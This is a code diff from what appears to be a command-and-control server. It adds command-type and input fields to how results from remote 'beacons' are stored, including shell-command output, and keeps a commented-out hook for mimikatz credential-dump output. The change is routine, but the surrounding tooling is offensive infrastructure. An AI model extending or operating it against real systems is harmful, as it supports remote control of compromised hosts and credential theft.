@@ -39,14 +39,14 @@ class Process:
             task_id = Generic.create_random(10)
             create_tasks = Tasks.create(beacon_id, tasks.command.name, tasks.input, task_id)
                         
-    def task(beacon_id, task_id, command, output):
+    def task(beacon_id, task_id, command, cmd_type, cmd_input, output):
         result = Existance.task(beacon_id, task_id)
         if result["result"] == "success":
             decoded_output = base64.b64decode(output)
             task_enddate = datetime.datetime.now()
             magic_object = magic.Magic(mime=True)
             magic_type = "text/plain" if command == "exec_shell" else magic_object.from_buffer(decoded_output)
-            result = Result.store_result(beacon_id, task_id, command, decoded_output, magic_type)
+            result = Result.store_result(beacon_id, task_id, command, cmd_type, cmd_input, decoded_output, magic_type)
             # if 'mimikatz(powershell)' in task_res:
             #     self.mimikatz(beacon_id, task_res, post_data)
         return result
